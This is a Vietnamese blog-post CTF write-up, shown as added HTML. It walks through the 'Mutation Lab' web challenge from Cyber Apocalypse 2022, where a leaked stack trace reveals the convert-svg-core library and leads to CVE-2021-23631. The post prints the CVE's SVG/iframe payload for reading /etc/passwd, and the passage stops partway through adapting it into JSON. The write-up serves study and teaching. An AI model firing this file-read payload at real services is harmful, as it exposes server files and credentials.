@@ -1,0 +1,870 @@
+<!DOCTYPE html>
+<html lang="vi">
+  <head>
+    
+    <script type="application/ld+json">
+
+{  
+  "@context":"http://schema.org",
+  "@type":"Website",
+  "@id":"https:\/\/manhnv.com\/",
+  "author": {
+    "@type": "Person",
+    "name": "Manh NV",
+    
+    "image": "https://manhnv.com/favicon.png"
+    
+  },
+  "name":"Chia sẻ là niềm vui",
+  "description":"Đợt vừa rồi, mình có tham gia thi Cyber Apocalypse CTF 2022 , năm ngoái mình cũng tham gia giải Cyber Apocalypse CTF 2021 có viết writeup xịn xò Cyber Apocalypse 202 1 Writeup, chủ yếu mình tham gia giải mấy bài web là chính.\nNăm nay tham gia thì cũng mục đích vào xem đề web hay có hay không, chứ không có ý định đi sâu, thì đâu đó ngồi hơn một buổi sáng thì clear được mấy bài như hình dưới:",
+  "url":"https:\/\/manhnv.com\/2022\/05\/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao\/",
+  "keywords":"[, manhnv, development, cyber security, hacker, CTF, CTF writeup]"
+}
+
+</script>
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="generator" content="Hugo 0.95.0 with theme Tranquilpeak 0.5.3-BETA">
+<meta name="author" content="Manh NV">
+<meta name="keywords" content=", manhnv, development, cyber security, hacker, CTF, CTF writeup">
+<meta name="description" content="Đợt vừa rồi, mình có tham gia thi Cyber Apocalypse CTF 2022 , năm ngoái mình cũng tham gia giải Cyber Apocalypse CTF 2021 có viết writeup xịn xò Cyber Apocalypse 202 1 Writeup, chủ yếu mình tham gia giải mấy bài web là chính.
+Năm nay tham gia thì cũng mục đích vào xem đề web hay có hay không, chứ không có ý định đi sâu, thì đâu đó ngồi hơn một buổi sáng thì clear được mấy bài như hình dưới:">
+
+
+<meta property="og:description" content="Đợt vừa rồi, mình có tham gia thi Cyber Apocalypse CTF 2022 , năm ngoái mình cũng tham gia giải Cyber Apocalypse CTF 2021 có viết writeup xịn xò Cyber Apocalypse 202 1 Writeup, chủ yếu mình tham gia giải mấy bài web là chính.
+Năm nay tham gia thì cũng mục đích vào xem đề web hay có hay không, chứ không có ý định đi sâu, thì đâu đó ngồi hơn một buổi sáng thì clear được mấy bài như hình dưới:">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hack một ứng dụng web thông qua lỗi Improper Error Handling như thế nào?">
+<meta name="twitter:title" content="Hack một ứng dụng web thông qua lỗi Improper Error Handling như thế nào?">
+<meta property="og:url" content="https://manhnv.com/2022/05/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/">
+<meta property="twitter:url" content="https://manhnv.com/2022/05/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/">
+<meta property="og:site_name" content="Chia sẻ là niềm vui">
+<meta property="og:description" content="Đợt vừa rồi, mình có tham gia thi Cyber Apocalypse CTF 2022 , năm ngoái mình cũng tham gia giải Cyber Apocalypse CTF 2021 có viết writeup xịn xò Cyber Apocalypse 202 1 Writeup, chủ yếu mình tham gia giải mấy bài web là chính.
+Năm nay tham gia thì cũng mục đích vào xem đề web hay có hay không, chứ không có ý định đi sâu, thì đâu đó ngồi hơn một buổi sáng thì clear được mấy bài như hình dưới:">
+<meta name="twitter:description" content="Đợt vừa rồi, mình có tham gia thi Cyber Apocalypse CTF 2022 , năm ngoái mình cũng tham gia giải Cyber Apocalypse CTF 2021 có viết writeup xịn xò Cyber Apocalypse 202 1 Writeup, chủ yếu mình tham gia giải mấy bài web là chính.
+Năm nay tham gia thì cũng mục đích vào xem đề web hay có hay không, chứ không có ý định đi sâu, thì đâu đó ngồi hơn một buổi sáng thì clear được mấy bài như hình dưới:">
+<meta property="og:locale" content="vi">
+
+  
+    <meta property="article:published_time" content="2022-05-19T00:00:00">
+  
+  
+    <meta property="article:modified_time" content="2022-05-19T00:00:00">
+  
+  
+  
+    
+      <meta property="article:section" content="ctf">
+    
+  
+  
+    
+      <meta property="article:tag" content="ctf">
+    
+      <meta property="article:tag" content="Cyber Apocalypse 2022">
+    
+      <meta property="article:tag" content="ctf web writeup">
+    
+      <meta property="article:tag" content="writeup">
+    
+  
+
+
+<meta name="twitter:card" content="summary">
+
+
+
+
+
+
+
+  <meta property="og:image" content="https://manhnv.com/favicon.png">
+  <meta property="twitter:image" content="https://manhnv.com/favicon.png">
+
+
+
+
+
+  <meta property="og:image" content="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_12.17.01.png">
+  <meta property="twitter:image" content="https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_12.17.01.png">
+
+
+    <title>Hack một ứng dụng web thông qua lỗi Improper Error Handling như thế nào?</title>
+
+    <link rel="icon" href="https://manhnv.com/favicon.png">
+    
+
+    
+
+    <link rel="canonical" href="https://manhnv.com/2022/05/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/">
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha512-H9jrZiiopUdsLpg94A333EfumgUBpO9MdbxStdeITo+KEIMaNfHNvwyjjDJb+ERPaRS6DpyRlKbvPUasNItRyw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    
+    
+    
+    <link rel="stylesheet" href="https://manhnv.com/css/style-h6ccsoet3mzkbb0wngshlfbaweimexgqcxj0h5hu4h82olsdzz6wmqdkajm.min.css" />
+    
+    
+      
+        <link rel="stylesheet"  href="https://manhnv.com/css/mystyle.css">
+      
+    
+
+    
+      
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-128983514-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+    
+    
+  </head>
+
+  <body>
+    <div id="blog">
+      <header id="header" data-behavior="5">
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="/" aria-label="Tới trang chủ">Chia sẻ là niềm vui</a>
+  </div>
+  
+    
+      <a class="header-right-picture "
+         href="/#about" aria-label="Mở liên kết: /#about">
+    
+    
+    
+      
+        <img class="header-picture" src="https://manhnv.com/favicon.png" alt="Ảnh đại diện" />
+      
+    
+    </a>
+  
+</header>
+
+      <nav id="sidebar" data-behavior="5">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="/#about" aria-label="Tìm hiểu thêm về tác giả">
+          <img class="sidebar-profile-picture" src="https://manhnv.com/favicon.png" alt="Ảnh đại diện" />
+        </a>
+        <h4 class="sidebar-profile-name">Manh NV</h4>
+        
+          <h5 class="sidebar-profile-bio">Chia sẻ là niềm vui</h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="/donate.html" title="Donate">
+    
+      <i class="sidebar-button-icon fa fa-usd"></i>
+      
+      <span class="sidebar-button-desc">Donate</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="/" title="Home">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-home"></i>
+      
+      <span class="sidebar-button-desc">Trang chủ</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="/categories" title="Categories">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
+      
+      <span class="sidebar-button-desc">Danh mục</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="/tags" title="Tags">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
+      
+      <span class="sidebar-button-desc">Thẻ thông tin</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="/archives" title="Archives">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
+      
+      <span class="sidebar-button-desc">Lưu trữ</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="/#about" title="About">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-question"></i>
+      
+      <span class="sidebar-button-desc">Thông tin</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="/copyrights" title="Copyrights">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-copyright"></i>
+      
+      <span class="sidebar-button-desc">Copyrights</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/0xmanhnv" target="_blank" rel="noopener" title="GitHub">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-github"></i>
+      
+      <span class="sidebar-button-desc">GitHub</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://facebook.com/manhnv.sec" target="_blank" rel="noopener" title="Facebook">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-facebook"></i>
+      
+      <span class="sidebar-button-desc">Facebook</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://www.youtube.com/channel/UCEY3DBfSDupbSG96jfcSDwQ?sub_confirmation=1" target="_blank" rel="noopener" title="Youtube">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-youtube"></i>
+      
+      <span class="sidebar-button-desc">Youtube</span>
+    </a>
+  </li>
+
+
+    </ul>
+  </div>
+</nav>
+
+      
+
+      <div id="main" data-behavior="5"
+        class="
+               hasCoverMetaIn
+               ">
+        <article class="post" id="top">
+          
+          
+            <div class="post-header main-content-wrap text-left">
+  
+    <h1 class="post-title">
+      Hack một ứng dụng web thông qua lỗi Improper Error Handling như thế nào?
+    </h1>
+  
+  
+  <div class="postShorten-meta post-meta">
+    
+      <time datetime="2022-05-19T00:00:00Z">
+        
+  tháng 5 19, 2022
+
+      </time>
+    
+    
+  
+  
+    <span>mục</span>
+    
+      <a class="category-link" href="/categories/ctf">ctf</a>
+    
+  
+
+    |
+    <a href="https://manhnv.com/2022/05/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/#post-comments">
+	    <i class="fa fa-comments-o" aria-hidden="true"></i>
+	    <span class="disqus-comment-count" data-disqus-url="https://manhnv.com/2022/05/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/">First article</span>
+	</a>
+  </div>
+
+</div>
+          
+          <div class="post-content markdown">
+            <div class="main-content-wrap">
+              <p>Đợt vừa rồi, mình có tham gia thi <strong><code>Cyber Apocalypse CTF 2022</code> ,</strong> năm ngoái mình cũng tham gia giải <strong><code>Cyber Apocalypse CTF 2021</code></strong> có viết writeup xịn xò <a href="https://manhnv.com/tags/cyber-apocalypse-2021/">Cyber Apocalypse 202 1 Writeup</a><strong>,</strong> chủ yếu mình tham gia giải mấy bài web là chính.</p>
+<p>Năm nay tham gia thì cũng mục đích vào xem đề web hay có hay không, chứ không có ý định đi sâu, thì đâu đó ngồi hơn một buổi sáng thì clear được mấy bài như hình dưới:</p>
+<p><img src="/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-20_at_00.54.39.png" alt="Những bài web đã giải được."></p>
+<p>Những bài web đã giải được.</p>
+<p>Lý do mình không làm thêm là, dạo này đang bận rất nhiều việc với lại team của mình cũng bận chả ai tham gia, mình ham hố vào giải web thôi.</p>
+<p>Ok, lý do thế đủ rồi, giờ vào nội dung chính bài nay nè. <code>Từ Improper Error Handling đến RCE như thế nào ?</code></p>
+<h2 id="đề-bài">Đề bài</h2>
+<p>Bài web này có tên là <strong><code>Mutation Lab</code></strong></p>
+<p><img src="/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_12.11.50.png" alt="Screen Shot 2022-05-15 at 12.11.50.png"></p>
+<p>Địa chỉ web: <code>http://134.209.20.90:31789</code>, đây là một bài blackbox vì không được cung cấp source code.</p>
+<p>Truy cập vào địa chỉ <a href="http://134.209.20.90:31789/"><code>http://134.209.20.90:31789/</code></a> chúng ta được một page như bên dưới nha.</p>
+<p><img src="/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_12.14.18.png" alt="Screen Shot 2022-05-15 at 12.14.18.png"></p>
+<h2 id="cấu-hình-và-phân-tích-website-này-một-chút">Cấu hình và Phân tích website này một chút</h2>
+<h3 id="cấu-hình-burpsuite">Cấu hình Burpsuite</h3>
+<p>Để làm bài này mình cấu hình target scope cho Burpsuite rồi làm tiếp nhé. Nếu các bạn chưa biết Burpsuite thì có thể tự tìm hiểu <a href="https://portswigger.net/burp">ở đây</a> nhé.</p>
+<p><img src="/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_12.13.03.png" alt="Screen Shot 2022-05-15 at 12.13.03.png"></p>
+<h3 id="dạo-vòng-quanh-và-phân-tích">Dạo vòng quanh và phân tích</h3>
+<p>Khi truy cập vào địa chỉ được cũng cấp, thì ứng dụng hiển thị ra 1 page có chức năng login và register.</p>
+<p>Trước tiên chưa có tài khoản nên mình cứ thử register trước xem sao nhé. Thử đăng ký một tài khoản có tên <code>0xmanhnv</code></p>
+<p><img src="/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_12.16.34.png" alt="Screen Shot 2022-05-15 at 12.16.34.png"></p>
+<p>Đăng ký thành công! và đăng nhập với tài khoản vừa đăng ký thì được một trang đầy rẫy <code>trung tình</code>  và 1 hình ảnh giống miếng <code>thịt bò</code> (Thực ra là hình ảnh tế bào) như thế này:</p>
+<p><img src="/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_12.17.01.png" alt="Screen Shot 2022-05-15 at 12.17.01.png"></p>
+<p>Mình tiếp tục dạo 1 vòng các chức năng có trên ứng dụng này, thì mình tổng hợp được một số chức năng như sau:</p>
+<ul>
+<li><code>Reset Experimentation</code> → Chức năng này là reset lại trạng thái của miếng <code>thịt bò</code> kia và mấy con <code>trung tình</code> về 1 trạng thái random, không có sự tương tác với server.</li>
+<li><code>Export Cell Structure</code> → ? Chưa biết chức năng này dùng làm gì và sẽ tìm hiểu ở phần sau.</li>
+<li><code>Export TadPole Samples</code> → ? Chưa biết chức năng này dùng làm gì và sẽ tìm hiểu ở phần sau.</li>
+<li><code>Logout</code> → chức năng này không cần quan tâm</li>
+</ul>
+<p>Giờ là lúc tìm hiểu 2 chức năng <code>Export Cell Structure</code> và <code>Export TadPole Samples</code> làm những gì.</p>
+<p>Khi bấm vào <code>Export TadPole Samples</code>, ứng dụng sẽ xử lý một cái gì đó và đưa mình đến đến 1 link ảnh <a href="http://134.209.20.90:31789/exports/c212e64c11dadcfc4f23986a47f2b84b.png"><code>http://134.209.20.90:31789/exports/c212e64c11dadcfc4f23986a47f2b84b.png</code></a>. Hình ảnh này có mấy con <code>trung tình</code> ở trạng thái giống với lúc mình bấm nút <code>Export TadPole Samples</code> .Mình đoán là ảnh này là chụp lại trạng thái mấy con <code>trung tình</code> ở thời điểm bấm nút và được export thành ảnh png.</p>
+<p><img src="/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_12.22.53.png" alt="Screen Shot 2022-05-15 at 12.22.53.png"></p>
+<p>Tiếp theo thử bấm nút <code>Export Cell Structure</code> , thì cũng tương tự như trên nhưng lần này là <code>miếng thịt bò</code> đã được export ra thành ảnh png.</p>
+<p><img src="/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_12.24.24.png" alt="Screen Shot 2022-05-15 at 12.24.24.png"></p>
+<p>Vậy là mình đã hiểu sơ qua về cách hoạt động của ứng dụng trên UI, giờ mình thử chuyển qua Burpsuite kiểm tra thử xem, thực sự thì 2 chức năng này nó tương tác với server như thế nào?</p>
+<p>Khi vào Burpsuite, mình thấy Burpsuite đã bắt được 7 requests, trong đó</p>
+<ul>
+<li><code>/</code> là lúc mình đi đến đường dẫn <a href="http://134.209.20.90:31789/"><code>http://134.209.20.90:31789/</code></a></li>
+<li><code>/api/register</code> là lúc bấm nút đăng ký</li>
+<li><code>/api/login</code> là lúc bấm nút login</li>
+<li><code>/api/dashboard</code> khi login thành công, được chuyển hướng sang dashboard</li>
+<li>2 requests <code>/api/export</code>  trả về kết quả thành công → Mình đoán là do tôi bấm vào <code>Export Cell Structure</code> và <code>Export TadPole Samples</code></li>
+<li>1 requests <code>/api/export</code>  trả về kết quả <code>Error</code> ⇒ Mình cho nó là đáng nghi ngờ, và chắc chắn cần phải kiểm tra.</li>
+</ul>
+<p><img src="/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_12.26.07.png" alt="Screen Shot 2022-05-15 at 12.26.07.png"></p>
+<p>Mình tiến hành xem qua 3 request <code>/api/export</code>.</p>
+<ul>
+<li>Với 2 requests thành công, thì thấy dữ liệu gửi lên là dữ liệu là <code>json</code> có <code>key</code> là <code>svg</code> với <code>value</code> là <code>nội dung của ảnh SVG</code>.</li>
+</ul>
+<p><img src="/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_12.30.23.png" alt="Screen Shot 2022-05-15 at 12.30.23.png"></p>
+<p>Sau khi request được gửi thành công, dữ liệu được trả về là 1 đường dẫn tới ảnh png <code>/exports/17cd2093d6247f486094b36d6e39bec4.png</code> so sánh kết quả của cả 2 request thì chính là đường dẫn của 2 ảnh được export ra bên trên.</p>
+<p><img src="/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_12.31.33.png" alt="Screen Shot 2022-05-15 at 12.31.33.png"></p>
+<p>Đến đây mình lại đoán hoặc kết luận luôn trong suy nghĩ của mình cũng được là: Khi bấm vào nút <code>Export Cell Structure</code> hoặc <code>Export TadPole Samples</code>, Client sẽ chụp lại trạng thái của bầy <code>trung tình</code> hoặc <code>miếng thịt bò</code> tương ứng bằng <code>svg</code> sau đó gửi dữ liệu <code>svg</code> đó lên server để server <code>export</code> ra ảnh <code>png</code> và trả về đường dẫn cho client hiển thị lên.</p>
+<p>Ok, vậy requests thành công thì là như thế, nhưng request bị lỗi thì sao nhỉ?</p>
+<p>Tiếp tục xem nội dung request lỗi thì thấy trong dữ liệu json gửi lên, value của <code>svg</code> là <code>null</code></p>
+<p><img src="/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_12.33.53.png" alt="Screen Shot 2022-05-15 at 12.33.53.png"></p>
+<p>Xem response lỗi được trả về:</p>
+<p><img src="/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_12.34.53.png" alt="Screen Shot 2022-05-15 at 12.34.53.png"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span> <span style="color:#a6e22e">lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">title</span>&gt;Error&lt;/<span style="color:#f92672">title</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">pre</span>&gt;TypeError: Cannot read properties of null (reading &amp;#39;indexOf&amp;#39;)&lt;<span style="color:#f92672">br</span>&gt; &amp;nbsp; &amp;nbsp;at Converter.[convert] (/app/node_modules/convert-svg-core/src/Converter.js:191:25)&lt;<span style="color:#f92672">br</span>&gt; &amp;nbsp; &amp;nbsp;at Converter.convert (/app/node_modules/convert-svg-core/src/Converter.js:114:40)&lt;<span style="color:#f92672">br</span>&gt; &amp;nbsp; &amp;nbsp;at API.convert (/app/node_modules/convert-svg-core/src/API.js:80:32)&lt;<span style="color:#f92672">br</span>&gt; &amp;nbsp; &amp;nbsp;at /app/routes/index.js:61:21&lt;<span style="color:#f92672">br</span>&gt; &amp;nbsp; &amp;nbsp;at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)&lt;<span style="color:#f92672">br</span>&gt; &amp;nbsp; &amp;nbsp;at next (/app/node_modules/express/lib/router/route.js:144:13)&lt;<span style="color:#f92672">br</span>&gt; &amp;nbsp; &amp;nbsp;at Route.dispatch (/app/node_modules/express/lib/router/route.js:114:3)&lt;<span style="color:#f92672">br</span>&gt; &amp;nbsp; &amp;nbsp;at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)&lt;<span style="color:#f92672">br</span>&gt; &amp;nbsp; &amp;nbsp;at /app/node_modules/express/lib/router/index.js:286:22&lt;<span style="color:#f92672">br</span>&gt; &amp;nbsp; &amp;nbsp;at Function.process_params (/app/node_modules/express/lib/router/index.js:348:12)&lt;/<span style="color:#f92672">pre</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p>Mình lại đoán tiếp (Vì khi mà không biết chắc chắn thì cứ đoán): Khi Client gửi nội dung <code>svg</code> với giá trị <code>null</code>, ứng dụng không xử lý được và gây ra lỗi nhưng lỗi này không được xử lý trước khi trả về, mà trả thẳng lỗi của runtime của ứng dụng về cho Client, và vô tình ta biết được một số thông tin của ứng dụng.</p>
+<p>Trong lỗi trả về này, tôi có được một số thông tin có thể hữu ích như sau</p>
+<ul>
+<li><code>/app/routes/index.js</code> → Nơi chứa source code route của ứng dụng này, từ đây có thể suy đoán ra được folder <code>/app</code> chính là nơi chứa <code>source code</code> của ứng dụng.</li>
+<li><code>TypeError: Cannot read properties of null (reading 'indexOf')&lt;br&gt; at Converter.[convert] (/app/node_modules/convert-svg-core/src/Converter.js:191:25)</code> → lỗi không thể xử lý với <code>properties null</code> xảy ra trong <code>/app/node_modules/convert-svg-core/src/Converter.js</code> → vậy là ứng dụng có sử dụng module có tên là <code>convert-svg-core</code></li>
+</ul>
+<h2 id="tìm-lỗ-hổng">Tìm lỗ hổng</h2>
+<p>Sau khi đi qua các chức năng, và hiểu sơ qua về ứng dụng, đây là lúc đi tìm lỗ hổng. Hiện tại chức năng nghi ngờ nhất, và khiến mình muốn tập trung nhất là chức năng export với API <code>/api/export</code></p>
+<p>Sao lại như vậy? Vì:</p>
+<ul>
+<li>Có sự tương tác với server.</li>
+<li>Dữ liệu sai (Ví dụ ở đây là null) thì server trả về lỗi, vậy là lỗi không được thực hiện tiền xử lý. → Unstrusted data</li>
+</ul>
+<p>Ở phần trên, tôi đã biết ứng dụng sử dụng <code>convert-svg-core</code>, trước hết mình target vào module này bằng cách đi tìm xem nó có tồn tại vuln nào tồn tại trong module này không?</p>
+<p><img src="/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_13.09.39.png" alt="Screen Shot 2022-05-15 at 13.09.39.png"></p>
+<p>Search google thì ra rất nhiều kết quả là <code>CVE-2021-23631</code> lỗ hổng Directory Traversal rất mới, năm 2021, được <code>7.5 điểm</code>, lỗ hổng mức <code>high</code>. Thử tìm hiểu về CVE này xem nhé.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//security.snyk.io/vuln/SNYK-JS-CONVERTSVGCORE-1582785
+</span></span></span></code></pre></div><p><img src="/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_13.11.10.png" alt="Screen Shot 2022-05-15 at 13.11.10.png"></p>
+<p>Đọc qua về CVE thì mình có thể biết được payload trong phần ví dụ của CVE.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">svg-dummy</span>&gt;&lt;/<span style="color:#f92672">svg-dummy</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;**file:///etc/passwd**&#34;</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;100%&#34;</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1000px&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">svg</span> <span style="color:#a6e22e">viewBox</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0 0 240 80&#34;</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1000&#34;</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1000&#34;</span> <span style="color:#a6e22e">xmlns</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://www.w3.org/2000/svg&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">text</span> <span style="color:#a6e22e">x</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#a6e22e">y</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Rrrrr&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;demo&#34;</span>&gt;data&lt;/<span style="color:#f92672">text</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">svg</span>&gt;
+</span></span></code></pre></div><p>Hiểu sơ qua thì payload này sử dụng thẻ <code>iframe</code> chèn vào nội dung <code>svg</code>, và <code>iframe</code> sẽ load <code>file:///path/to/file</code> , trong ví dụ là load file <code>/etc/passwd</code></p>
+<p>Trước tiên, tôi thử với payload có được, để xem nó có chạy không?</p>
+<p>Nhưng trước khi chạy chúng ta cần làm một số thao tác để chuẩn hóa lại payload, vì data request lên server là ở dạng json</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;svg&#34;</span>: <span style="color:#e6db74">&#34;payload&#34;</span>}
+</span></span></code></pre></div><p>Nên những dấu <code>&quot;</code> trong payload cần đưa về <code>'</code> hoặc <code>\&quot;</code> để không bị <code>escape</code> ra khỏi json, tôi thực hiện một số thao tác magic như bên dưới.</p>
+<p>Replace <code>&quot;</code> thành <code>\&quot;</code></p>
